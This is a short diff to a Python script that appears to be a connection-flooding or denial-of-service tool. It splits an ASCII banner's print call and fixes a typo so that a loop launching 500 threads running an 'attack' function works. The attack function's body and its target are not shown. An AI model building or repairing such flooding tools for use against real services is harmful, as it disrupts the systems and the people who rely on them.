@@ -6,6 +6,11 @@ print(
     ___   ___           __
     |  '  |  '    __   /
     | | | | | |  '  '  \_
+"""
+    )
+
+print(
+"""
     | | | | | | | || |   \
     |__'  |__'   '__'  __/
     ________________________
@@ -32,5 +37,5 @@ def attack():
         already_connectected += 1
         
 for i in range(500):
-    thread = threding.Thread(target=attack)
+    thread = threading.Thread(target=attack)
     thread.start()
